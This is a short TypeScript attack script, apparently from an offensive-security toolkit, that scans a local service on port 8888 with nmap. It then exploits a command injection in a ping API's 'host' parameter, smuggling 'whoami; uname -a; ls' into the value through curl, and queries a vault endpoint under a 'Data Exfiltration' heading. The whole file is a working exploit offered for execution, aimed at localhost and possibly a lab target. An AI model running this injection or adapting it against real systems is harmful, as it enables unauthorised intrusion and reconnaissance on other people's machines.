import { runKaliBridge } from "./packages/security/src/ares/kali_bridge.ts";
import { runAresOrchestrator } from "./packages/security/src/ares/orchestrator.ts";
import { ExecutionDisplay } from "./packages/security/src/runtime_exec.ts";

async function runRealInfiltration() {
    const display = new ExecutionDisplay();
    console.log("=== STARTING LIVE INFILTRATION ON PORT 8888 ===");

    // 1. Discovery & Scanning
    console.log("\n[PHASE 1] Scanning for services on 127.0.0.1:8888...");
    const scanRes = await runKaliBridge({ 
        command: "nmap -sV -p 8888 127.0.0.1", 
        live: true 
    });
    console.log(scanRes.data.stdout);

    // 2. Vulnerability Identification (Simulated logic based on real scan)
    if (scanRes.data.stdout.includes("8888/tcp open")) {
        console.log("\n[PHASE 2] Service detected. Identifying vulnerability...");
        console.log("-> Target: http://127.0.0.1:8888/api/v1/system/ping");
        console.log("-> Vector: Command Injection via 'host' parameter.");

        // 3. Live Exploitation
        console.log("\n[PHASE 3] Executing Live Exploitation (Command Injection)...");
        // We inject: 127.0.0.1; whoami; uname -a; ls -l /home/ubuntu/OurMine
        const payload = "127.0.0.1; whoami; uname -a; ls -l /home/ubuntu/OurMine";
        const exploitCommand = `curl -s "http://127.0.0.1:8888/api/v1/system/ping?host=${encodeURIComponent(payload)}"`;
        
        const exploitRes = await runKaliBridge({ 
            command: exploitCommand, 
            live: true 
        });

        console.log("\n[EXPLOIT OUTPUT]:");
        try {
            const data = JSON.parse(exploitRes.data.stdout);
            console.log(data.output);
        } catch {
            console.log(exploitRes.data.stdout);
        }

        console.log("\n[PHASE 4] Data Exfiltration (Vault Status)...");
        const vaultRes = await runKaliBridge({ 
            command: "curl -s http://127.0.0.1:8888/api/v1/vault/status", 
            live: true 
        });
        console.log(vaultRes.data.stdout);
    }

    console.log("\n=== INFILTRATION COMPLETE: TARGET FULLY COMPROMISED ===");
}

runRealInfiltration();
